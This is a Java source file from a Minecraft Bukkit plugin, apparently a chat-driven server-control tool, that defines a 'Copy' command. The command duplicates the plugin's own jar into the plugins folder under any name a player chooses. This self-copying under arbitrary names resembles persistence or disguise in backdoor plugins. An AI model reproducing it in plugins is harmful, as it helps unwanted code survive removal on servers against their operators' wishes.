package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.main.Main;
import de.impact.utils.ChatUtils;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

public class Copy extends Command {

    public Copy() {
        super("Copy", "Copy <Name>", "Copy the plugin under a specific name in the plugin folder", CommandCategory.SERVER);
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 1) {
            sendUsage(p);
            return;
        }

        StringBuilder name = new StringBuilder();

        for(String s : aliases)
            name.append(s).append(" ");

        File f = new File("plugins/" + name.toString().trim() + ".jar");

        if(!f.getParent().equals("plugins")) {
            ChatUtils.sendMessage(p, "Please only configure the filename");
            return;
        }

        try {
            Files.copy(Main.getPluginFile().toPath(), f.toPath());
        } catch (IOException ignored) {
            ChatUtils.sendMessage(p, "There was an error while copying, please try again");
            return;
        }

        ChatUtils.sendMessage(p, "Successfully copied the plugin as §a" + name.toString().trim() + ".jar");

    }

}
